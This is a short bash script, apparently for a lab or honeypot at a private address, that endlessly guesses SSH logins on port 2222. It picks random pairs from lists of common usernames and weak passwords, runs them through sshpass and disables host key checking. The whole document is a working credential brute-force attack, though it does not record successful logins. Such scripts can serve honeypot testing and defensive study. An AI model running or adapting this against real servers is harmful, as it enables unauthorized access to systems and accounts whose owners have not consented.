
#!/bin/bash

TARGET_IP="10.0.2.15"
TARGET_PORT=2222

USERNAMES=("admin" "root" "user" "test" "guest" "oracle" "ftp" "mysql" "apache")
PASSWORDS=("123456" "password" "admin" "root" "test" "qwerty" "abc123" "letmein")

while true; do
    USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
    PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}

    echo "Trying $USER : $PASS"
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $TARGET_PORT $USER@$TARGET_IP "exit" >/dev/null 2>&1

    sleep 1
done

